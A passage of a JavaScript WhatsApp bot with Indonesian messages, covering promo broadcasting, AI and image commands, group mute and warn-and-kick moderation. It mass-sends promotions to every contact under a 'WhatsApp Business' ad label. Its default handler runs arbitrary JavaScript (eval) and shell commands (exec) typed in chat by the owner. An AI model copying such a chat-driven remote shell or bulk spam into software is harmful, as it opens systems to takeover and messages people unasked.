      targetList = all.filter(c => c.id?.endsWith("@newsletter")).map(c => c.id)
    } else if (promo.target === "kontak") {
      const all = [...(global.store?.chats?.array || [])]
      targetList = all.filter(c => c.id?.endsWith("@s.whatsapp.net")).map(c => c.id)
    }

    for (const id of targetList) {
      try {
        if (p.gambar) {
          await NXL.sendMessage(id, {
            image: Buffer.from(p.gambar, "base64"),
            caption: teks,
            contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              title: "WhatsApp Business",
              body: "XRESX DIGITAL STORE 2.0",
              sourceUrl: "https://wa.me/6287728163189",
              mediaType: 1,
              renderLargerThumbnail: false
            }
          }
            })
        } else {
          await NXL.sendMessage(id, {
            text: teks,
            contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              title: "WhatsApp Business",
              body: "XRESX DIGITAL STORE 2.0",
              sourceUrl: "https://wa.me/6287728163189",
              mediaType: 1,
              renderLargerThumbnail: false
            }
          }
            })
        }
      } catch {
      }
      await sleep(3000)
    }
  }

  global.intervalPromo = setInterval(kirimPromo, promo.interval)
  await kirimPromo()
}
break

case 'nxlai': {
  if (!args[0]) return reply(`> [ NXL BOT ]
\`PENGGUNAAN SALAH\`
*contoh ${command} on/off*
<>`);

  if (args[0] === 'on') {
    if (global.db.users[m.sender].NXL) return reply(`> [ NXL BOT ]
\`PENGGUNAAN BENAR\`
*sudah on sebelumnya*
<>`);
    global.db.users[m.sender].NXL = true
    reply(`> [ NXL BOT ]
\`PENGGUNAAN BENAR\`
*berhasil ke mode on*
<>`);
  } else if (args[0] === 'off') {
    if (!global.db.users[m.sender].NXL) return reply(`> [ NXL BOT ]
\`PENGGUNAAN BENAR\`
*sudah off sebelumnya*
<>`);
    global.db.users[m.sender].NXL = false
    reply(`> [ NXL BOT ]
\`PENGGUNAAN BENAR\`
*berhasil ke mode off*
<>`);
  }
}
break

case 'imagine': {
  if (!text) return reply(`> [ NXL BOT ]
\`PENGGUNAAN SALAH\`
*contoh: .imagine kucing lucu anime*
<>`)
  try {
    const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}?nologo=true&width=512&height=512`
    await NXL.sendMessage(from, { 
      image: { url: imageUrl }, 
      caption: `🎨 *Generated by ${ownername}*\n_${text}_` 
    }, { quoted: m })
  } catch (err) {
    reply('Gagal generate gambar: ' + err.message)
  }
}
break

case "mute": {
  if (!isCreator) return m.reply(mess.owner)

  let mutePath = './database/mutegrup.json'
  let muteList = []
  try { muteList = JSON.parse(fs.readFileSync(mutePath, 'utf8')) } catch { muteList = [] }

  if (m.isGroup) {
    if (!isAdmins && !isCreator) return m.reply("Hanya admin grup atau owner yang dapat menonaktifkan bot.")
    if (muteList.includes(from)) return m.reply("Bot sudah dinonaktifkan di grup ini.")
    muteList.push(from)
    fs.writeFileSync(mutePath, JSON.stringify(muteList, null, 2))
    return m.reply(`Bot telah dinonaktifkan di grup ini.\nKetik .unmute untuk mengaktifkan kembali.`)
  }

  const allGroups = await NXL.groupFetchAllParticipating()
  const groupEntries = Object.entries(allGroups)
  if (groupEntries.length === 0) return m.reply("Bot tidak terdaftar di grup manapun.")

  const rows = groupEntries.map(([id, meta]) => ({
    title: meta.subject || id,
    description: muteList.includes(id) ? "Dinonaktifkan" : "Aktif",
    id: `.mute-toggle ${id}`
  }))

  // [FIX] Bagi rows ke multi-section @24 agar semua grup tampil (WA limit 24 per section)
  const chunkSize = 24
  const sections = []
  for (let i = 0; i < rows.length; i += chunkSize) {
    sections.push({
      title: `Nonaktifkan Bot — ${ownername} (${Math.floor(i/chunkSize)+1})`,
      rows: rows.slice(i, i + chunkSize)
    })
  }

  await NXL.sendMessage(m.chat, {
    buttons: [{
      buttonId: 'mute_select',
      buttonText: { displayText: 'Pilih Grup' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup untuk Mute/Unmute',
          sections
        })
      }
    }],
    headerType: 1,
    viewOnce: true,
    text: `Nonaktifkan Bot per Grup\nSilakan pilih grup yang ingin dinonaktifkan atau diaktifkan.\n\nStatus: Dinonaktifkan / Aktif`
  }, { quoted: m })
}
break

case "mute-toggle": {
  const groupId = text.trim()
  if (!isCreator) return m.reply(mess.owner)
  if (!groupId || !groupId.endsWith('@g.us')) return m.reply("ID grup tidak valid.")

  let mutePath = './database/mutegrup.json'
  let muteList = []
  try { muteList = JSON.parse(fs.readFileSync(mutePath, 'utf8')) } catch { muteList = [] }

  let groupName2 = groupId
  try { const meta = await NXL.groupMetadata(groupId); groupName2 = meta.subject } catch {}

  if (muteList.includes(groupId)) {
    muteList = muteList.filter(id => id !== groupId)
    fs.writeFileSync(mutePath, JSON.stringify(muteList, null, 2))
    return m.reply(`Bot telah diaktifkan kembali di:\n${groupName2}`)
  } else {
    muteList.push(groupId)
    fs.writeFileSync(mutePath, JSON.stringify(muteList, null, 2))
    return m.reply(`Bot telah dinonaktifkan di:\n${groupName2}`)
  }
}
break

case "unmute": {
  if (!isCreator) return m.reply(mess.owner)

  let mutePath = './database/mutegrup.json'
  let muteList = []
  try { muteList = JSON.parse(fs.readFileSync(mutePath, 'utf8')) } catch { muteList = [] }

  if (m.isGroup) {
    if (!isAdmins && !isCreator) return m.reply("Hanya admin grup atau owner yang dapat mengaktifkan kembali bot.")
    if (!muteList.includes(from)) return m.reply("Bot tidak sedang dinonaktifkan di grup ini.")
    muteList = muteList.filter(id => id !== from)
    fs.writeFileSync(mutePath, JSON.stringify(muteList, null, 2))
    return m.reply("Bot telah diaktifkan kembali di grup ini.")
  }

  if (muteList.length === 0) return m.reply("Tidak ada grup yang sedang dinonaktifkan.")

  const rows = []
  for (const gid of muteList) {
    let gname = gid
    try { const meta = await NXL.groupMetadata(gid); gname = meta.subject } catch {}
    rows.push({
      title: gname,
      description: "Ketuk untuk mengaktifkan kembali",
      id: `.mute-toggle ${gid}`
    })
  }

  await NXL.sendMessage(m.chat, {
    buttons: [{
      buttonId: 'unmute_select',
      buttonText: { displayText: 'Pilih Grup' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup untuk Diaktifkan Kembali',
          sections: [{
            title: `Aktifkan Kembali Bot — ${ownername}`,
            rows: rows.slice(0, 24)
          }]
        })
      }
    }],
    headerType: 1,
    viewOnce: true,
    text: `Aktifkan Kembali Bot\nBerikut adalah daftar grup yang sedang dinonaktifkan.\nSilakan pilih grup yang ingin diaktifkan kembali.`
  }, { quoted: m })
}
break

case "muteinfo": {
  if (!isCreator) return m.reply(mess.owner);

  const mutePath = './database/mutegrup.json';
  let muteList = [];
  
  try { 
    muteList = JSON.parse(fs.readFileSync(mutePath, 'utf8')); 
  } catch { 
    muteList = []; 
  }

  // Jika dipanggil di dalam grup, tampilkan status grup tersebut
  if (m.isGroup) {
    const isMuted = muteList.includes(from);
    const status = isMuted 
      ? "NONAKTIF — bot tidak merespons di grup ini." 
      : "AKTIF — bot berjalan normal.";
    return m.reply(`Status bot di grup ini:\n${status}`);
  }

  // Jika dipanggil di privat chat dan daftar mute kosong
  if (muteList.length === 0) {
    return m.reply("Semua grup dalam kondisi aktif, tidak ada yang dinonaktifkan.");
  }

  // Menampilkan seluruh daftar grup yang di-mute
  let info = `Daftar Grup yang Dinonaktifkan\n${"─".repeat(25)}\n`;
  
  for (const gid of muteList) {
    let gname = gid;
    try { 
      const meta = await NXL.groupMetadata(gid); 
      gname = meta.subject; 
    } catch {
      gname = `Grup Tidak Diketahui (${gid.split('@')[0]})`;
    }
    info += `• ${gname}\n`;
  }
  
  return m.reply(info.trim());
}
break;


case "warn": {
  if (!m.isGroup) return m.reply("Command ini hanya untuk grup.")
  if (!isAdmins && !isCreator) return m.reply("Hanya admin / owner yang bisa warn.")

  const toSWA = (jid) => {
    if (!jid) return null
    const rawNum = jid.replace(/@.*$/, '')
    if (participants && participants.length) {
      if (jid.includes('@lid') || !jid.includes('@s.whatsapp.net')) {
        const found = participants.find(p => {
          const pLid = (p.lid || p.id || '').replace(/@.*$/, '')
          return pLid === rawNum
        })
        if (found && found.jid) return found.jid.replace(/@.*$/, '') + '@s.whatsapp.net'
        if (found && found.id && found.id.includes('@s.whatsapp.net')) return found.id
      }
      const found = participants.find(p => (p.jid || p.id || '').replace(/@.*$/, '') === rawNum)
      if (found) return (found.jid || found.id).replace(/@.*$/, '') + '@s.whatsapp.net'
    }
    return rawNum + '@s.whatsapp.net'
  }

  let rawTarget = null
  if (m.quoted) {
    rawTarget = m.quoted.sender
  } else if (m.mentionedJid && m.mentionedJid.length > 0) {
    rawTarget = m.mentionedJid[0]
  } else if (text) {
    const mentionMatch = text.match(/@([0-9]{8,15})/)
    if (mentionMatch) rawTarget = mentionMatch[1] + '@s.whatsapp.net'
  }

  if (participants && participants.length) {
  }

  const warnTarget = toSWA(rawTarget)
  console.log(`[WARN CMD] raw:${rawTarget} → resolved:${warnTarget}`)

  if (!warnTarget) return m.reply(`Cara pakai:\n- Reply pesan member: .warn\n- Tag member: .warn @nomor`)
  if (warnTarget.split('@')[0] === _botJid.split('@')[0]) return m.reply("Tidak bisa warn bot sendiri.")
  if (!isCreator && groupAdmins.includes(warnTarget)) return m.reply("Tidak bisa warn sesama admin.")

  let warnPath = './database/warndata.json'
  let warnData = {}
  try {
    const raw = JSON.parse(fs.readFileSync(warnPath, 'utf8'))
    warnData = Array.isArray(raw) ? {} : raw
  } catch { warnData = {} }

  if (!warnData[from]) warnData[from] = {}
  if (!warnData[from][warnTarget]) warnData[from][warnTarget] = 0

  warnData[from][warnTarget]++
  const warnCount = warnData[from][warnTarget]
  const maxWarn = 3

  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))

  if (warnCount >= maxWarn) {
    warnData[from][warnTarget] = 0
    fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))

    await NXL.sendMessage(m.chat, {
      text: `*WARN ${maxWarn}/${maxWarn}*\n@${warnTarget.split('@')[0]} telah mencapai batas warn!\nMember dikick dari grup.`,
      mentions: [warnTarget]
    }, { quoted: m })

    try {
      await NXL.groupParticipantsUpdate(m.chat, [warnTarget], "remove")
    } catch (e) {
      await m.reply("Gagal kick: " + e.message)
    }
  } else {
    await NXL.sendMessage(m.chat, {
      text: `*WARN ${warnCount}/${maxWarn}*\n@${warnTarget.split('@')[0]} mendapat peringatan.\n${warnCount === 2 ? 'Satu warn lagi = KICK!' : 'Hati-hati, jangan melanggar aturan grup.'}`,
      mentions: [warnTarget]
    }, { quoted: m })
  }
}
break

case "warnlist": {
  if (!m.isGroup) return m.reply("Command ini hanya untuk grup.")
  if (!isAdmins && !isCreator) return m.reply("Hanya admin / owner.")

  let warnPath = './database/warndata.json'
  let warnData = {}
  try { warnData = JSON.parse(fs.readFileSync(warnPath, 'utf8')) } catch { warnData = {} }

  const groupWarn = warnData[from] || {}
  const entries = Object.entries(groupWarn).filter(([, v]) => v > 0)

  if (entries.length === 0) return m.reply("Tidak ada member yang punya warn di grup ini.")

  let list = `*Daftar Warn — ${groupName}*\n${"─".repeat(25)}\n`
  entries.forEach(([uid, count], i) => {
    list += `${i + 1}. @${uid.split('@')[0]} -> ${count}/3\n`
  })

  await NXL.sendMessage(from, {
    text: list,
    mentions: entries.map(([uid]) => uid)
  }, { quoted: m })
}
break

case "resetwarn": {
  if (!m.isGroup) return m.reply("Command ini hanya untuk grup.")
  if (!isAdmins && !isCreator) return m.reply("Hanya admin / owner yang bisa reset warn.")

  const toSWA2 = (jid) => {
    if (!jid) return null
    const rawNum = jid.replace(/@.*$/, '')
    if (participants && participants.length) {
      if (jid.includes('@lid') || !jid.includes('@s.whatsapp.net')) {
        const found = participants.find(p => (p.lid || p.id || '').replace(/@.*$/, '') === rawNum)
        if (found && found.jid) return found.jid.replace(/@.*$/, '') + '@s.whatsapp.net'
        if (found && found.id && found.id.includes('@s.whatsapp.net')) return found.id
      }
      const found = participants.find(p => (p.jid || p.id || '').replace(/@.*$/, '') === rawNum)
      if (found) return (found.jid || found.id).replace(/@.*$/, '') + '@s.whatsapp.net'
    }
    return rawNum + '@s.whatsapp.net'
  }

  let rawTarget = null
  if (m.quoted) {
    rawTarget = m.quoted.sender
  } else if (m.mentionedJid && m.mentionedJid.length > 0) {
    rawTarget = m.mentionedJid[0]
  } else if (text) {
    const mentionMatch = text.match(/@([0-9]{8,15})/)
    if (mentionMatch) rawTarget = mentionMatch[1] + '@s.whatsapp.net'
  }

  const warnTarget = toSWA2(rawTarget)
  console.log(`[RESETWARN CMD] raw:${rawTarget} → resolved:${warnTarget}`)
  if (!warnTarget) return m.reply(`Cara pakai:\n- Reply pesan member: .resetwarn\n- Tag member: .resetwarn @nomor`)

  let warnPath = './database/warndata.json'
  let warnData = {}
  try { warnData = JSON.parse(fs.readFileSync(warnPath, 'utf8')) } catch { warnData = {} }

  const _groupWarn = warnData[from] || {}
  const targetNum = warnTarget.split('@')[0]
  const _existingKey = Object.keys(_groupWarn).find(k => k.split('@')[0] === targetNum)

  if (!_existingKey || _groupWarn[_existingKey] === 0) {
    return await NXL.sendMessage(from, {
      text: `@${warnTarget.split('@')[0]} tidak punya warn.`,
      mentions: [warnTarget]
    }, { quoted: m })
  }

  warnData[from][_existingKey] = 0
  fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))

  await NXL.sendMessage(from, {
    text: `✅ Warn @${warnTarget.split('@')[0]} berhasil direset.`,
    mentions: [warnTarget]
  }, { quoted: m })
}
break

case "teslink":
  await NXL.sendMessage(m.chat, { 
    text: "https://wa.me/6287728163189",
    linkPreview: null 
  }, { quoted: m })
break
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
